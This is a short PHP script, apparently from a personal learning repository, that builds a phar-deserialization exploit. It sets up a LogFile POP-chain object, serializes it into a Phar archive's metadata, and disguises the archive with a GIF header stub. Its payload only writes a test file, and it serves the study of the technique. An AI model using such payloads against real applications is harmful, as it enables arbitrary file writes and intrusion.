<?php
// Create the POP Chain

class LogFile
{
    public function __construct(){
        $this->filename = '/Users/tsvetkoff/Programming/Github_repos/IppSec-PHP-Deserialization/expluatation/itWorks.txt';
        $this->fcontents = 'IT WORKS!!!';
    }
}

// Create the Phar Archive
$phar = new \Phar("test.phar");
$phar->startBuffering();
$phar->setStub("GIF8;<?php __HALT_COMPILER(); ?>");

//Begin of serialization
$payload = new LogFile();
$phar->setMetadata($payload);

//Zip file within the phar archive
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>